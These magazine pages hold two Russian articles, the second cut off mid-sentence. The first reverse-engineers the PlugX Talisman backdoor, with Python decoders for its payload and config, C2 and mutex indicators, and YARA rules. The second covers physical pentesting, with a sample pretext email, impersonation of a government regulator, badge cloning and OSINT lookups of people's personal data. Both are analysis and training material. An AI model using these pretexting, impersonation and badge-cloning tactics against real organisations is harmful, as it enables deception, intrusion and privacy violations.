LOG. Далее исполняемый код, полученный после расшифровки этого файла,
 извлекает конфигурацию PlugX Talisman, а также основную полезную нагрузку
 PlugX, тоже представленную в виде динамической библиотеки. Она содержит
основной модуль вредоноса PlugX Talisman, который загружается в память про‐
 цесса SNAC.EXE.





                       Принцип работы PlugX Talisman

В этой статье мы изучим образец вредоносной программы, научимся про‐
водить ее анализ, найдем интересные участки в коде модуля, расшифруем
файл SNAG.LOG, а также получим конфигурацию PlugX Talisman и извлечем
основную полезную нагрузку PlugX.


             INFO

                 О том, как из подручных материалов с помощью
                             смекалки и  умелых  рук  построить  скворечник
                        лабораторию для анализа вредоносов, подробно
                             рассказано в статье «Код под надзором. Создаем
                            виртуальную лабораторию для анализа малвари» .



ИНСТРУМЕНТАРИЙ

Для дальнейшего исследования вредоносного файла воспользуемся  сле‐
дующим софтом:
 1. DIE — программа для определения типов файлов.
 2. PeStudio — программа для поиска артефактов в исполняемых файлах.
 3. IDA Pro — интерактивный дизассемблер, используемый для реверс‑инжи‐
    ниринга.
 4. Wireshark — инструмент для анализа сетевых протоколов.
 5. Burp Suite — используется в качестве прозрачного прокси‑сервера с целью
    анализа взаимодействия вредоносного файла по протоколу HTTPS.
 6. Loki Scanner — сканер IOCs.
  7. YaraEditor — программа для тестирования и создания правил YARA.
 8. ApiLogger — утилита для анализа вызываемых WinAPI-функций исследуемо‐
   го вредоноса.
 9. x64dbg — отладчик с открытым исходным кодом для Windows, предназна‐
    ченный для анализа вредоносных программ.
10. Process Hacker — утилита для мониторинга процессов и служб.
11. Плагин mkYARA для IDA — плагин для генерации правил YARA на основе
    кода.


ПЕРВИЧНЫЙ АНАЛИЗ

Прежде чем приступать к реверсу файлов, получим первичную информацию
об исследуемых образцах. Загрузим файл SNAC.EXE в PeStudio. При анализе
необходимо обратить внимание на строки, подключаемые библиотеки, версии
 файлов, сертификаты, а также на сведения о файле отладки, которые в некото‐
рых случаях помогают атрибутировать разработчика.
    Перейдем на вкладку Version.





                      Описание исполняемого файла

 Оригинальное имя файла — SNAC.exe, цифровая подпись указывает на то, что
файл разработан компанией Symantec Corporation.



                             Строка файла отладки

Файл отладки расположен по следующему пути:


C:\bld_area\sesagent70\snac_build\bin.ira\snac.pdb

 Перейдем на вкладку Libraries.





                        Подключаемые библиотеки

PeStudio определяет список библиотек, которые злоумышленники используют
при написании вредоноса. Перейдем на вкладку Сertificate.





                       Информация о подписи файла

Файл SNAC.exe является подписанным, безопасным файлом. Теперь откроем
файл WGXMAN.DLL в PeStudio.





                             Описание файла

В файле присутствует строка о файле отладки:


C:\bld_area\sesagent70\snac_build\bin.ira\wgxman.pdb

 Перейдем на вкладку Strings, в которой можно обнаружить строку SNAC.LOG.
    Теперь выполним поведенческий анализ, получим информацию о процессе
и запишем сетевой трафик. Запустим исполняемый файл SNAC.EXE, затем
 откроем Process Hacker и соберем информацию о процессе.


            WARNING

                    Не  рекомендуется  исследовать  вредоносные
                        программы на рабочей операционной системе,
                              поскольку  это  может  привести  к  заражению
                    машины и утере ценных данных.


 После  запуска  исполняемого  файла вредонос  создал дочерний  процесс
conhost.exe.



                             Процесс SNAC.exe

Нажмем два раза на имя этого процесса, откроем вкладку Modules.


                     Загружаемая библиотека WGXMAN.dll

Как видно из рисунка, вредонос загрузил динамическую библиотеку WGXMAN.
dll. Посмотрим генерируемый приложением трафик.





                   Взаимодействие с управляющим сервером

Модуль  PlugX  Talisman  начинает  устанавливать  сетевое  взаимодействие
с управляющим сервером dhsg123[.]jkub[.]com. После получения адреса
домена устанавливается TCP-соединение по порту 80.



                          Содержимое TCP-пакета

 Также исследуемый образец обращается к управляющему серверу по протоко‐
лу HTTP.





                         Содержимое HTTP-пакета

В результате первичного анализа мы получили информацию о вредоносном
 процессе, узнали адрес управляющего сервера, установили протокол взаимо‐
 действия, а также обнаружили интересные строки и описание файлов.


РАЗБОР МАЛВАРИ

Приступим к подробному исследованию кода. Динамический анализ будем
проводить с использованием утилиты x64dbg. Анализ псевдокода выполним
в IDA Pro с установленным плагином HexRays. Чтобы получить наиболее пол‐
ный результат, при анализе вредоносных программ необходимо комбиниро‐
вать инструменты.
   Программа SNAC.EXE представляет собой безопасный исполняемый файл,
который имеет валидную цифровую подпись. Его основная задача — загрузка
 динамической библиотеки WGXMAN.DLL методом DLL side-loading. После заг‐
рузки библиотеки выполнение передается на функцию экспорта DllMain.
Далее динамическая библиотека расшифровывает исполняемый код в файле
SNAC.LOG и передает выполнение на него.
   Приступим к анализу. Для этого загрузим исполняемый файл SNAC.EXE
в утилиту x64dbg, в которой будем проводить отладку. Также загрузим динами‐
 ческую библиотеку WGXMAN.DLL в IDA.
   Для проведения динамического анализа необходимо найти точку останова,
с которой начинается выполнение основных функций программы. Для этого
 проанализируем код загружаемой библиотеки и найдем функцию, подходящую
для этой цели.
  В IDA открываем вкладку File → Open и выбираем файл WGXMAN.DLL. После
 загрузки файла мы попадаем на функцию DllMain. Далее декомпилируем код,
 используя плагин HexRays, для этого нажимаем клавишу F5. И синхронизируем
 анализ кода на вкладке IDA View-A и Pseudocode-A, для чего перенесем вклад‐
 ку Pseudocode-A в правую часть вкладки IDA View-A. Нажатием правой кнопки
мыши выберем Syncronize with → IDA View-A, теперь при выборе участка кода
он будет подсвечиваться в каждой вкладке.





                           Участок кода функции DllMain

 Переходим в функцию sub_6FE443C, эта функция и будет точкой входа во вре‐
мя динамической отладки. Проанализируем ее.





                     Код функции sub_6FE443C

Функция sub_6FE42A0 служит для получения списка функций экспорта динами‐
 ческой библиотеки kernel32.dll.





                    Содержимое функции sub_6FE42A0

Начнем отладку в x64dbg. Для этого перейдем к функции sub_6FE443C нажати‐
ем сочетания клавиш Ctrl-G, затем наберем адрес функции и разберем алго‐
ритм расшифровки констант.





                        Переход по адресу 6FE443C

Поставим точку останова на вход функции. Нажмем F7 для захода в функцию
и увидим интересующие нас константы.




         Контрольные суммы функций экспорта библиотеки kernel32.dll





                           Начало отладки вредоноса

Зайдем в функцию call  wgxman.6FE42D4 и разберем механизм  поиска
экспортных функций библиотеки kernel32.dll.





                      Алгоритм дешифрования констант





                     Псевдокод функции дешифрования

В  функции sub_6FE42D4  расположен  алгоритм  преобразования  функции
 экспорта библиотеки kernel32.dll. Имена экспортируемых функций не хра‐
 нятся в открытом виде, поэтому трояну следует сначала привести их в пригод‐
ный для использования вид. Для этого на вход функции sub_6DE42D4 поступа‐
ет константа и список функций экспорта библиотеки kernel32.dll, далее
из названия функции экспорта считывается символ, преобразуется по алгорит‐
му ROR со смещением 7, а затем получается сумма всех преобразованных
 символов.
   Напишем этот алгоритм преобразования в виде программы на Python. Спи‐
сок функций экспорта возьмем с сайта geoffchappell.com.


name_const = ['0xc917432','0xf8062593','0xef64a41e','0xf4e2f2b2',
'0xb4ffafed','0xbbafdf85']


ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


f = open('list_export_kernel32.txt','r')
w = open('out_export.txt','w+')


def decode(s: str):
    result = 0
     for j in s:
        result = ror(result,7,32)
        result += ord(j)
    return hex(result)


for i in f:
     s = i.replace('\n','')
     d = decode(s)
     if d in func:
        w.write(s + '-' + d +'\n')


f.close()
w.close()

 Запустив программу, мы получим следующий результат.





                  Вывод функции декодирования констант

Преобразуем псевдокод в читаемый формат, воспользовавшись возможнос‐
тями IDA  Pro. Горячая клавиша N  позволяет переименовать переменные
в псевдокоде IDA.





                Преобразованный псевдокод функции 6FE443C

 После проверки того, что имя запущенного файла содержит .NAC., управление
передается по адресу 0x6FE44E1.
  Мы разобрали метод запутывания названий функций вредоносом. Теперь
перейдем к участку кода, где расшифровывается файл SNAC.LOG. Для этого
найдем функцию CreateFileA, воспользовавшись сочетанием клавиш Ctrl-G.





                       Переход на функцию CreateFileA

По адресу 0x6FE43C8 происходит вызов функции CreateFileA, а в регистре
EAX содержится путь к файлу SNAC.LOG.





        Участок кода вызова функций CreateFileA, GetFileSize, VirtualAlloc

Далее вредонос получает размер файла SNAC.LOG с использованием функции
GetFileSize. Затем  происходит выделение памяти с помощью функции
VirtualAlloc.
   Продолжаем отлаживать код: нажимаем F8 и спускаемся к адресу функции
ReadFile.



                           Вызов функции ReadFile

 Перейдем к значению в памяти ds:[edi+0x3C] (параметр lpBuffer функции
ReadFile). Так как по этому адресу хранятся значения, нажимаем правой кноп‐
кой мыши на [edi+0x3c] и переходим на вкладку «Перейти к дампу → Зна‐
чение [edi+0x3C]». После выполнения функции по этому адресу сохранится
содержимое файла SNAC.LOG.





                Адрес в памяти содержимого файла SNAC.LOG

По адресу 0x00550000  хранится содержимое файла SNAC.LOG. Нажимаем
F8 и двигаемся дальше. Находим участок кода, в котором расшифровывается
этот файл.





                  Алгоритм расшифрования файла SNAC.LOG

В регистр ESI передаются значения по адресу [edi+3c] (там хранится содер‐
жимое файла SNAC.LOG), далее с каждым байтом файла происходит  сле‐
дующее преобразование. Сначала из него вычитается значение 0x48, далее
 выполняется операция XOR со значением 0x19, и, наконец, полученный резуль‐
 тат складывается со значением 0xA7. Далее выполнение кода передается
на расшифрованные значения и вызывается функция call esi. Поставим точ‐
 ку останова на этом вызове.
    Давай напишем на Python код расшифровки файла SNAC.LOG и загрузим
расшифрованный файл в IDA Pro.


f = open('SNAC.LOG','rb')
w = open('SNAC_DECODE.LOG','wb+')
cont = f.read()
result = bytearray()
for i in cont:
    #print(i)
     b = i - 0x48
     b ^= 0x19
     b += 0xa7
    result.append(b & 0xff)


w.write(result)
f.close()
w.close()

 Полученный расшифрованный файл SNAC_DECODE.LOG загрузим в IDA Pro
и разберем его код.





                Участок кода расшифрованного файла SNAC.LOG

Как видно из рисунка, происходит запуск функции sub_269DD, в качестве вто‐
рого аргумента передается размер файла SNAC.LOG, равный 159 981 байту.
При   выполнении    этого   кода   происходит   поиск   WinAPI-функции
GetProcAddress.





                         Поиск функции GetProcAddress




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ
 ОПАСНЫЙ ТАЛИСМАН

                                    ИЗУЧАЕМ
                          ВРЕДОНОС TALISMAN
                                  НА ПРАКТИКЕ




Далее  вредонос  получает  адреса  следующих  функций:  LoadLibraryA,
VirtualAlloc, VirtualFree, ExitThread, RtlDecompressBuffer, memcpy.





                          Получение адресов функций

Затем происходят следующие преобразования.





                            Преобразование данных

На рисунке выше показан алгоритм расшифровки полезной нагрузки, спрятан‐
ной внутри динамической библиотеки. С целью замедления расшифровки пять
раз вызывается функция Sleep, затем расшифрованный буфер распаковывает‐
ся с помощью функции RtlDecompressBuffer.  Преобразованные данные
будут  сохранены  в  переменной  v29,  для  которой  выделяется  память
с помощью функции VirtualAlloc. Наша задача — при отладке попасть
на функцию RtlDecompressBuffer, перейти про адресу переменной v29
и сохранить область памяти. Так мы получим основную полезную нагрузку вре‐
доноса PlugX.
   Приступаем  к  отладке. Мы  останавливались на  операнде call  esi.
Заходим в функцию, нажимаем клавишу F7, а затем F8. Проходим этап получе‐
ния адресов функций, далее, минуя этап расшифровки полезной нагрузки,
остановимся перед запуском функции RtlDecompressBuffer. Эту функцию мож‐
но отыскать, спускаясь вниз по участку кода либо перейдя на ее вызов.
Для этого можно использовать сочетание клавиш Ctrl-G в x64dbg, после чего
следует ввести название функции, на которую мы хотим перейти.





                     Вызов функции RtlDecompressBuffer

В   регистре   ESI    хранятся    преобразованные   данные   (параметр
UncompressBuffer). Щелкнем правой кнопкой мыши на этом регистре, затем
нажмем «Перейти к дампу → esi» и получим основную нагрузку вредоноса
PlugX.





                 Основная нагрузка модуля PlugX Talisman

Сохраним полученный код, для этого щелкнем правой кнопкой мыши на регис‐
тре ESI и выберем в открывшемся меню пункт «Перейти к карте памяти».


                                   Карта памяти

Нажмем правую кнопку мыши, чтобы сохранить дамп в файл. Мы выгрузили
основную нагрузку вредоноса. Чуть позже мы загрузим ее в IDA Pro и разберем
функциональность, а для начала посмотрим, что происходит после расшифров‐
ки полезной нагрузки. В отладчике спускаемся немного ниже (F8) и попадаем
на формирование внутренней структуры вредоноса.





                  Формирование структуры PlugX Talisman

Спустимся до участка кода mov dword ptr ds:[esi],CF455089 и перейдем
к дампу по адресу в регистре ESI. Для этого наводим курсор на регистр [esi],
нажимаем правую кнопку мыши и открываем дамп.
   Компании Trellix и «Доктор Веб» описывали схожие структуры PlugX, но мы
разберем их самостоятельно.





                       Описание структуры Talisman





                 Дамп памяти структуры Talisman

Первые 4 байта содержат значение 0xCF455089, которое является сигнатурой
структуры. Размер конфигурации Talisman равен 0x1924 байт, а зашифрован‐
ный участок конфигурации хранится по адресу 0x610013 (в твоем отладчике
адрес будет отличаться).
   Перейдем по адресу 0x610013, для этого нажмем правую кнопку мыши и в
открывшемся меню выберем пункт «Перейти к дампу DWORD».





         Содержимое зашифрованной конфигурации PlugX Talisman

Скопируем полученное значение и сохраним в файл encrypt_talisman.txt.


                    Начало и конец конфигурации Talisman

Мы нашли конфигурацию Talisman, теперь отыщем участок кода, который его
расшифровывает.
   Для этого загрузим сохраненный дамп полезной нагрузки PlugX Talisman
в IDA Pro. Нам известно, что длина конфигурации составляет 0x1924 байт,
а сигнатура конфигурации имеет вид 0xCF455089. Найдем участок кода, где
происходит сравнение сигнатуры и объема памяти конфигурации.
  В IDA Pro открываем вкладку Search → Sequence of bytes и вводим значение
0x1924.





                    Поиск количества байтов конфигурации





      Список найденных участков кода сравнения объема конфигурации

Переходим в функцию sub_100243A0 и находим сравнение сигнатуры Talisman,
а также размера файла конфигурации.





                  Участок кода расшифровки структуры Talisman

Функция      sub_1000A710,      которую     мы       переименовали
в Decrypt_Config_Talisman, содержит участок кода расшифровки структуры
бэкдора.





                    Алгоритм расшифровки конфигурации

Данный участок кода схож с модулем PlugX.38 . Давай напишем на Python алго‐
ритм   расшифровки   конфигурации,  которую  мы   сохранили  в  файл
encrypt_talisman.txt.


def DWORD(i):
    return i & 0xFFFFFFFF


def LOBYTE(i):
    return i & 0x000000FF


def dec(key, in_data):
    k1 = k2 = k3 = k4 = key
    result = bytearray()
    for x in in_data:
        k1 = DWORD(k1 + (k1 >> 3) - 0x11111111)
        k2 = DWORD(k2 + (k2 >> 5) - 0x22222222)
        k3 = DWORD(k3 + 0x33333333 - (k3 << 7))
        k4 = DWORD(k4 + (0x44444444 - (k4 << 9)))
        k = LOBYTE(k1 + k2 + k3 + k4)
        result.append(ord(x) ^ k)
    return result


f = open('encrypt_config.txt','r')
w = open('decrypt_config_talisman','wb')


encrypt_config = [chr(int(i,base=16)) for i in f.read().split(' ')
]
key = 0x4CB8B675
w.write(dec(key,encrypt_config))
f.close()
w.close()

Запустив скрипт, мы получаем следующие значения.





                 Содержимое конфигурации PlugX Talisman

Размер конфигурации составляет 0x1924 байт, она содержит список панелей
управления и C2-серверов (dhsg123.jkub.com). А вот и другие полученные
нами полезные данные:
 • домашний каталог вредоноса — %ALLUSERSPROFILE%\SymantecSNAC;
 • мьютекс создаваемого процесса — Global\ReStart0 ;
 • целевой   процесс,   в  который   будет   внедряться   вредонос, —
  %SystemRoot%\system32\nslookup.exe;
 • имя отображаемой службы — SymantecSNAC;
 • идентификатор компании — TEST .

На текущем этапе мы расшифровали конфигурацию PlugX Talisman, теперь раз‐
берем основную нагрузку DLL PlugX, которую извлекли из памяти.
   Анализируя код основной нагрузки PlugX, можно обнаружить следующие
используемые плагины, расположенные в функции sub_1000B9F0.





                         Список плагинов вредоноса

После запуска полезной нагрузки вредонос создает следующие токены:
 • SeDebugPrivilege — эта привилегия позволяет процессу подключаться
   к любому процессу или ядру как отладчик;
 • SeTcbPrivilege —  позволяет  процессу  олицетворить любого  поль‐
   зователя без  проверки  подлинности,  таким  образом  процесс может
   получить доступ к тем же локальным ресурсам, что и этот пользователь.

Далее вредонос создает основной поток, который называется bootProc.





                          Участок кода создания токенов

Также в основной  нагрузке PlugX все функции Windows API вызываются
динамически на основе алгоритма CRC32 от названий функций. Но в алгорит‐
ме необходимо добавить завершающий нулевой байт. Алгоритм поиска фун‐
кций представлен ниже.


import zlib
f = open('list_ws2_32.txt','r')
m = ['0x49f9b50b','0xeaed580c']


for i in f:
    h=hex(zlib.crc32(bytes(i.replace('\n',''),'utf-8')+b'\x00'))
    if h in m:
        print(i,h)





       Разыменование функции gethostbyname из библиотеки ws2_32.dll





           Разыменование функции WSAIoctl библиотеки ws2_32.dll

В ходе  анализа мы  расшифровали файл SNAC.LOG,  конфигурацию PlugX
Talisman, в которой хранятся сведения о C2-серверах, а также расшифровали
основную нагрузку PlugX: она представляет собой DLL, загружаемую в память
процесса SNAC.exe.


СОЗДАНИЕ ПРАВИЛ

Давай создадим собственные правила YARA для детектирования процесса
PlugX Talisman в памяти Windows, а также его поиска в файловой системе. Нам
известен участок кода проверки сигнатуры структуры Talisman, а также его раз‐
мер. Этот код расположен в функции sub_100243A0 (полезной нагрузки PlugX).
Воспользуемся для этих целей плагином mkYARA для IDA.
   Наводим курсор мыши на участок кода и жмем правую кнопку, затем
в открывшемся меню выбираем пункт mkyara → Generate Normal Yara Rule.
Плагин сгенерирует правило для определения сигнатуры 0xCF455089. Те же
самые действия выполним на участке кода, в котором сравнивается длина кон‐
фигурации 0x1924. Сформируем следующее правило.


rule generated_rule
{
    meta:
        autor="rayhunt454"
        hash = "C6C6162CCA729C4DA879879B126D27C0"


    /*
    0x10024421L 8138895045CF  cmp dword ptr [eax], 0xcf455089
     */
    /*
    0x1002448aL 81781824190000  cmp dword ptr [eax + 0x18], 0x1924
     */
    strings:
        $chunk_1 = {
            81 38 89 50 45 CF
        }
        $chunk_2 = {
            81 78 ?? 24 19 00 00
        }


    condition:
        $chunk_1 and $chunk_2


}

Теперь разработаем правило для поиска вредоноса в файловой системе.
Будем детектировать загрузчик, в нашем случае это файл WGXMAN.dll.
  При анализе файла WGXMAN.dll мы обнаружили скрытую строку SNAC.LOG,
а также файл c отладочной информацией. На основе этих сведений сформиру‐
ем правило.


rule Plugx_WGXMAN
{
    meta:
        autor="rayhunt454"
        hash = "B4F12A7BE68D71F9645B789CCDC20561"


    strings:
        $snac = "SNAC.LOG" wide ascii
        $pdb = "sesagent70\\snac_build\\bin.ira\\wgxman.pdb"
nocase


    condition:
        $snac and $pdb


}

Протестируем разработанные сигнатуры. Для этого воспользуемся утилитой
YaraEditor. Откроем вкладку Test → Test items, нажмем кнопку Folder и выберем
каталог, в котором расположены вредоносные модули. Нажмем на кнопку
Process и выберем процесс SNAC.exe. После нажатия на кнопку Scan items
YaraEditor начинает искать строки.





                        Детект модуля в памяти Windows





                      Определение файла WGXMAN.dll

Мы научились разрабатывать сигнатуры для поиска вредоноса в файловой сис‐
теме и памяти Windows. В результате исследования мы сформировали сле‐
дующие IOCs: мьютекс Global\ReStart0, управляющий сервер dhsg123[.]
jkub[.]com, а также контрольные суммы исследуемых файлов.


             INFO

                    Для  поиска в файловой системе вредоносных
                         файлов на основе IOCs можно использовать ути‐
                       литу Loki Scanner, в которую есть возможность
                         добавлять правила YARA, хеш‑суммы модулей,
                       а также мьютексы.



ВЫВОДЫ

Мы научились исследовать вредоносные файлы и разрабатывать собственные
правила их детектирования. Процесс реверса очень долгий и иногда неп‐
ростой: необходимо использовать несколько инструментов для поиска нужных
вирусному аналитику участков кода. Для создания более гибких правил YARA
приходится исследовать множество схожих вредоносов и находить идентичные
участки кода. Перед тем как приступать к глубокому изучению образца, надо
провести первичный анализ файлов, найти в них интересные строки, а также
проверить их на наличие упаковщиков и крипторов.
ВЗЛОМ





ОТВЕЧАЕМ
НА ВОПРОСЫ
БУДУЩИХ
ВЗЛОМЩИКОВ
В БЕЛОЙ ШЛЯПЕ





В пентестерском комьюнити не так уж час‐
то разбирают тему физической безопас‐
ности объектов, на которых расположены
интересующие  нас  серверы.  А  зря!
При  анализе  векторов  атаки не  стоит             r00t_owl                                                                           Ведущий специалист
забывать и о возможности физического      компании «Информзащита»,                                                                                           в свободное время
проникновения,  а  не  только о  «бруте      преподаюCyberEdв онлайн-школе
хешей паролей». В этой статье мы ответим           parkour48@mail.ru
на самые животрепещущие вопросы, свя‐
занные с физическими пентестами, а еще
я поделюсь историей одного такого про‐
екта.


В ЧЕМ ОТЛИЧИЕ «ФИЗИЧЕСКОГО ПЕНТЕСТА» ОТ КРАЖИ
СО ВЗЛОМОМ?

Все, что ты делаешь, должно выполняться строго согласно договору, сос‐
тавленному вашей организацией и заказчиком. Учти, что любые отклонения
от методологии проведения работ или импровизация могут повлечь за собой
серьезные неприятности, в том числе применение физической силы сотрудни‐
ками соответствующих структур.


КАКИЕ НУЖНЫ ДОКУМЕНТЫ?

Имей в виду, что все твои действия (практически каждый шаг) должны быть
прописаны  в  методологии  физического  пентеста.  Согласование  такого
документа, как правило, занимает не один день, в него постоянно вносят прав‐
ки тестируемая организация и юристы с обеих сторон.
   Чаще всего руководитель проекта также подготовит пакет документов,
который будет в полной мере подтверждать твою личность. Стандартный
набор обычно состоит из копии паспорта, заверенной копии трудового догово‐
ра, документа с названием и серийным номером носимой техники (ноутбук,
смартфон, Proxmark и прочее) и справки, что у тебя нет судимости.
  В зависимости от рода деятельности проверяемой организации может пот‐
ребоваться предварительно оформить разные допуски, а также пройти инс‐
труктаж по технике безопасности. Делается это в первый день прибытия
на тестируемый объект.


О ЧЕМ НУЖНО ПРЕДУПРЕДИТЬ ЗАКАЗЧИКА?

Понятно, что неосведомленность  сотрудников о предстоящих работах —
это одно из необходимых нам условий. Исключением может быть разве что
начальник службы информационной безопасности. Увы, эти условия выпол‐
няются не всегда, что повышает сложность нашей задачи.
   Однако «грязно сыграть» можешь и ты сам, применив методы социальной
инженерии и договорившись с кем‑то из сотрудников организации заказчика.
Такой «договорняк» может, наоборот, упростить достижение целей аудита.
Подобные методы социального взаимодействия с персоналом заранее опи‐
сать и обговорить невозможно: универсального подхода к решению задач
такого характера не существует.
   Поэтому доля импровизации все же будет присутствовать, о чем стоит ска‐
зать контактному лицу проверяемой организации (тому самому начальнику
службы ИБ).


КАКИЕ МОГУТ ВОЗНИКНУТЬ ТРЕНИЯ С ПРАВООХРАНИТЕЛЬНЫМИ
ОРГАНАМИ?

Важно помнить, что силовые структуры практически всегда придерживаются
определенных  правил и  регламентов,  поэтому  попытки  вступить в спор
или разжечь конфликтную ситуацию ничем хорошим не кончатся. Поскольку
наши работы проводятся абсолютно легально, нет смысла активно сопротив‐
ляться. Твоим главным оружием должны быть подвешенный язык и знание
законов, умелое бравирование которым может заставить сотрудника физичес‐
кой безопасности засомневаться в правильности своих действий (опять спа‐
сает социалочка). Но ты должен всегда помнить о собственной ответствен‐
ности за совершенные действия и понимать риски отклонения от согласован‐
ной методологии.


ЧТО, ЕСЛИ Я ПОПАДУСЬ?

Успешным проектом можно считать тот, где ты выполнил все поставленные
задачи и при этом не спалился. Но бывает, что какой‑то сотрудник организации
проявляет бдительность и сообщает о подозрительном лице (то есть о тебе)
службе безопасности, за чем может последовать задержание.
   Именно на этом этапе можно провести границу между законными действи‐
ями и теми, которые влекут за собой уголовную ответственность. После задер‐
жания тебя, скорее  всего, отправят в «комнату ожидания». Затем кто‑то
из сотрудников службы безопасности задаст несколько вопросов, которые
помогут ему понять, кто ты такой и что за работы проводишь.
  Это самый подходящий момент,  чтобы  предъявить  папку с пакетом
документов, которые подтвердят твою личность и докажут, что твоя цель —
анализ защищенности компании, а не какая‑то диверсия или, например, про‐
мышленный шпионаж в пользу компании‑конкурента.


С ЧЕГО СТОИТ НАЧИНАТЬ?

Физический пентест можно разделить на два этапа — подготовка и реали‐
зация, то есть разведка и проникновение. Во время разведки мы изучаем
внешний и внутренний периметр объекта, анализируем обнаруженные слабые
места, решаем, какими путями будем проникать внутрь.
   Далее действуем методами социальной инженерии. Ищем способ сделать
копию электронного пропуска либо выдаем себя за работника обслуживающе‐
го персонала (инженер, уборщик, охранник), соискателя на вакансию, курьера
и так далее. В общем, за того, кого пропустят на территорию без лишних
подозрений.
  Чем тщательнее ты подойдешь к этапу разведки, тем более убедительную
личность сможешь изобразить. Здесь придется подумать о многих вещах,
начиная от легенды и заканчивая одеждой и сопутствующими документами.
   Второй этап — непосредственно проникновение. На этом этапе нам пред‐
стоит  преодолеть  физическую защиту при помощи  технических средств
и базовых инструментов медвежатника. Скорость и сноровка приобретаются
с опытом, то есть с каждым выполненным проектом. Ни один учебник, статья
или лекция не прибавят тебе уверенности в действиях, особенно когда речь
идет о работе, где уровень адреналина значительно выше нормы.
   Самообладание здесь — самое важное. Умение грамотно составить леген‐
ду и уверенно обманывать персонал помогут пройти в критически важные
помещения и, что еще важнее, уйти, не вызвав подозрений.





КАК ПРОВОДИТЬ РАЗВЕДКУ?

Прийти на объект и изучить:
 • Поломки или дырки в заграждениях.
 • Используемые для транспортировки сырья и отходов железнодорожные
   пути. Если нет дополнительных заграждений, можно попробовать пройти
   по ним пешком.
 • Подземный паркинг. Он нередко позволяет попасть в бизнес‑центр минуя
   проходную.
 • Всевозможные места выгрузки и погрузки. Через них тоже можно обойти
   проходную. Если такие зоны закрыты или не используются, то, как правило,
   они заперты на простые замки, вскрытие которых не представляет проб‐
   лем.
 • Технические помещения. Все остальные зоны, не попавшие в пункты выше,
   но также позволяющие миновать проверку пропуска.
 • Крыши и чердаки. Конечно, если удастся обнаружить пожарную лестницу
   или забраться без нее.


КАК ПОМОГАЕТ СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ?

OSINT, или разведка по открытым источникам — разведывательная дисципли‐
на, включающая в себя поиск, выбор и сбор разведывательной информации
из общедоступных источников, а также ее анализ.
   Первым делом нам нужно получить сведения о сотрудниках компании. Мы
выясняем  почты, телефоны,  аккаунты в  социальных сетях,  мессенджерах
и прочее.
   Собрать нужно следующее:
 • адреса электронных почт сотрудников;
 • документы — примеры договоров, штатное расписание и прочее в таком
   духе;
 • расположение организации;
 • планы зданий и сооружений;
 • месторасположение пропускных пунктов, камер видеонаблюдения и постов
   охраны.


КАКОЙ СОФТ ОБЛЕГЧАЕТ СБОР ДАННЫХ?

В первую очередь — поисковики, в том числе со всякими хитрыми запросами,
которые называют Google Dorks. Подробнее о них читай в статьях «Google
как средство взлома» и «Используем малоизвестные функции Google, чтобы
найти сокрытое».
   Также добавляй в закладки:
 • Google Hacking — помогает составлять дорки;
 • intelx.io и snov.io — бесплатные сервисы, которые помогают искать чувстви‐
   тельные данные вроде паролей, поддоменов, электронных почт и прочего;
 • Internet Archive — позволяет отмотать сайт назад к прошлым версиям. Воз‐
   можно, получится найти удаленную или скрытую в новых версиях информа‐
   цию;
 • OSINT Telegram-боты («Глаз бога» и иже с ним) — вводим имеющуюся у нас
   инфу (почтовый ящик, телефон, страничка в ВК) и получаем все, что есть
   в базе бота. Например, адреса, телефоны, социальные сети, данные пас‐
   порта, объявления;
 • Harvester — интересный инструмент для Linux, который собирает имена,
   электронные почты, IP-адреса, поддомены и URL-адреса, используя зап‐
   росы ко множеству открытых ресурсов;
 • уличные камеры. Их, к примеру, агрегируют Яндекс Карты. Там же могут
   найтись и ссылки на планы зданий;
 • сайты для поиска работы вроде HeadHunter. Если там найдутся резюме
   известных нам сотрудников IT-подразделения, мы сможем как минимум
   узнать о стеке технологий, с которыми они работают.





КАК СОСТАВЛЯТЬ ПИСЬМА ДЛЯ РАЗВЕДКИ?

Можешь представиться, например, сотрудником дочернего предприятия, сот‐
рудником службы информационной безопасности или же рабочим подрядной
организации. В общем, тем, от кого следующие дальше вопросы прозвучат
убедительно. Целью вопросов будет получить информацию о предприятии,
сетевом оборудовании, версиях операционных систем, программного обес‐
печения и так далее.
   Так как рассылать письма, возможно, придется массово, тут нам может
пригодиться фреймворк Gophish , который позволяет делать массовую рас‐
сылку, отслеживать получение писем, открытие вложенных файлов и переходы
по ссылкам внутри письма.
   Например, можно написать письмо в компанию, которая располагается
в одном здании с проверяемой, и попросить оформить временный пропуск:


      Добрый день!
     Моя компания заинтересована в ваших услугах. Для уточнения деталей«
      возможной сделки мне необходимо встретиться с вашим представите-
      лем. Прошу выписать временный пропуск в бизнес‑центр. Удостоверя-
     ющие личность документы приложены файлом к письму.
       С уважением, Зайцев Егор, представитель VIP Holiday                »
НЕЛЬЗЯ ЛИ ПРОСТО ПОЗВОНИТЬ?

Конечно, можно, а иногда даже лучше, чем писать письма! Вживую у твоего
собеседника будет меньше времени на сомнения, а у тебя появится шанс
блеснуть актерским мастерством.
   Звонишь в компанию и представляешься, например, сотрудником IT-фир‐
мы, обеспечивающей  техническую  поддержку  программного обеспечения
или оборудования организации. Прикрываясь легендой о починке и настройке,
выведываешь информацию об инфраструктуре объекта.


Пример из личного опыта
Я представился одним из управляющих в ФСТЭК (Федеральная служба по тех‐
ническому и экспортному контролю) и сообщил, что в данный момент мы про‐
водим сверку предоставленных данных по объектам инфраструктуры.
   У начальников цехов, заместителей начальников цехов, начальников сек‐
торов, администраторов я выспрашивал:
 • каков порядок получения наряда‑допуска, если он необходим;
 • где расположены критические узлы;
 • стоят ли замки и сигнализация на серверных шкафах;
 • существуют и оформлены ли матрицы доступа;
 • существуют и оформлены ли реестры автоматизированных систем (АСУ
   ТП).

Для подтверждения правильности сведений я иногда просил выслать на почту
проектную документацию.
   Что до рядовых сотрудников, то у них можно спросить, есть ли локальные
хранилища данных, а если есть, то где, а также выяснить график работы.



КАКИЕ ЕЩЕ ЕСТЬ СПОСОБЫ ПРОВЕСТИ РАЗВЕДКУ?

Можно попробовать изобразить, что ты соискатель на какую‑то вакансию,
и прийти на собеседование.
   Так можно будет выяснить массу полезной информации о предприятии, его
инфраструктуре, типе систем контроля доступа (СКУД), особенностей работы.
По возможности стоит постараться скопировать электронный пропуск, исполь‐
зуя приблуду типа Proxmark.
  На собеседовании можно попросить провести обзорную экскурсию и таким
